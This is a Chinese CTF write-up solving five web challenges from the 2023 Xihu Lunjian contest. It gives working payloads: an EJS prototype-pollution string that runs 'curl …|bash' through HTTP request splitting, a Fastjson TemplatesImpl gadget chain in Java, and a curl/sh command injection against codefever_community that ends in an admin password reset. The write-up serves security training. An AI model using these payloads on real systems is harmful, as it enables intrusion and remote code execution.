---
title: 2023 西湖论剑 web 5 题 WP
contest: 西湖论剑
year: 2023
difficulty: medium
vuln_type: [web_unknown, logic, rce, deserialize, ssti]
tags: [Node异常, 自定义zend_test.so, RC4解密, sudo提权, Unicode损坏HTTP拆分, EJS原型链污染, Fastjson反序列化, XString触发equals, codefever_community, 命令注入]
attack_chain: Node tolowercase 数组异常报错 → 泄露 cookie DASCTF{...} → php.ini 找 zend_test.so 路径 → 读出来逆 RC4 → 解密 index.php → RC4 加密一句话 → sudo chmod 777 /flag → Unicode 0x0100+ord 拆分 HTTP 头 → EJS constructor.prototype.outputFunctionName RCE → Fastjson @type 反序列化 XString+HotSwappableTargetSource → TemplatesImpl _bytecodes 加载恶意类 → git blameInfo 命令注入 revision=;`curl`&path=xxx → implode 拼空格绕过滤 → update cc_users 改 admin 密码进后台
key_payload: {"constructor.prototype.outputFunctionName":"x;global.process.mainModule.require('child_process').exec('curl http://x.x.x.x/bash.txt|bash');var x"} ; HotSwappableTargetSource(JSONArray(TemplatesImpl)) 链 ; /api/repository/blameInfo?repository=rkey&revision=;`curl&path=xxxx>/tmp/b
one_liner: Node 异常泄露 + 自定义 SO 加密 + Unicode HTTP 拆分污染 + Fastjson TemplatesImpl + codefever implode 注入。
lesson: Node 数组 tolowercase 异常、Unicode 拆字节污染 HTTP、EJS 原型链污染、codefever implode 数组拼空格是 web 综合题常见套路。
quality: high
---
# 2023 西湖论剑 web 5 题 WP

**一、扭转乾坤（Node 大小写绕过）**

传 list 数组触发 tolowercase 异常报错，泄露 cookie：`DASCTF{25983378830391925743269111888482}`。

**二、unusual php（自定义 zend_test.so）**

1. 读 index.php 发现是乱码（被改了 Zend 引擎）
2. phpinfo 找 `zend_test.so` 路径，下载下来 IDA 逆出 RC4 + 密钥
3. 用 cyberchef RC4 解密 index.php 拿到原始源码
4. RC4 加密一句话木马，先 base64 防止复制漏字节
5. 写 shell 后 `sudo chmod 777 /flag`（/etc/sudoer.bak 备份泄露 sudo 规则）

**三、real_ez_node（Node Unicode 损坏 + EJS 原型链污染）**

```python
payload = '''HTTP/1.1
POST /copy HTTP/1.1
Host: 127.0.0.1:3000
...
{"constructor.prototype.outputFunctionName":"x;global.process.mainModule.require('child_process').exec('curl http://x/x|bash');var x"}

GET / HTTP/1.1
test:'''.replace("n","rn")

def payload_encode(raw):
    return u"".join(chr(0x0100+ord(c)) for c in raw)
```

每个字符 `+ 0x100` 后，Node HTTP 解析器认为仍是合法字符，但下游 HTTP/1.1 解析会拆成新请求（HTTP Request Smuggling 思路），污染 EJS 的 `outputFunctionName` 走原型链拿到 RCE。

**四、easy_api（Java Fastjson TemplatesImpl）**

```java
TemplatesImpl templates = new TemplatesImpl();
setFieldValue(templates, "_bytecodes", new byte[][]{bytess});
setFieldValue(templates, "_transletIndex", 0);
setFieldValue(templates, "_name", "Pwnr");
setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());

ArrayList arrayList = new ArrayList();
arrayList.add(templates);
JSONArray toStringBean = new JSONArray(arrayList);
HotSwappableTargetSource v1 = new HotSwappableTargetSource(toStringBean);
HotSwappableTargetSource v2 = new HotSwappableTargetSource(new XString("xxx"));

HashMap s = new HashMap<>();
setFieldValue(s, "size", 2);
Object tbl = Array.newInstance(nodeC, 2);
Array.set(tbl, 0, nodeCons.newInstance(0, v1, v1, null));
Array.set(tbl, 1, nodeCons.newInstance(0, v2, v2, null));
setFieldValue(s, "table", tbl);
```

反序列化时 `HotSwappableTargetSource.equals` 被调用 → 触发 `XString.equals(JSONArray)` → toString → 调 `TemplatesImpl.getOutputProperties()` → 加载 `_bytecodes[0]` 字节码（恶意类继承 `AbstractTranslet`，static 块弹 shell）。

**五、real world git（codefever_community 命令注入）**

`/api/repository/blameInfo` 接口 revision 拼到 `git blame` 命令：
```bash
GET /api/repository/blameInfo?repository=rkey&revision=;`curl&path=xxxx>/tmp/b
GET /api/repository/blameInfo?repository=rkey&revision=;`sh&path=/tmp/b
mysql -uroot -proot -e 'use codefever_community;update cc_users set u_password="25e4826df708c36b367cc3eb32130820"'
```

`wrapArgument` 过滤空格，但 `Command::run` 用 `implode([' ', ...])` 拼参数 → 把 `;` 和 `curl` 用空格分开成多参数绕过滤。最后直接改 admin 密码进后台拿 flag。
